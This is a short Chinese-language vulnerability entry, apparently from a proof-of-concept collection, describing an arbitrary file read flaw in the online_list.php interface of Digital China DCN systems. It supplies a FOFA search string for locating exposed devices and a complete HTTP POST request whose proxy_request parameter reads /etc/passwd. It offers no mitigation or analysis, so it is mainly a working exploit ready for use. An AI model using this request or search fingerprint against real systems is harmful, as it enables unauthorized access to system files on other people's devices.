# 神州数码DCN系统接口online_list.php存在任意文件读取漏洞

神州数码DCN系统接口online_list.php存在任意文件读取漏洞

## fofa

```javascript
body="style/blue/css/dcn_ui.css"
```

## poc

```javascript
POST /function/auth/user/online_list.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

proxy_request=/etc/passwd
```

![图片](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412181058717.webp)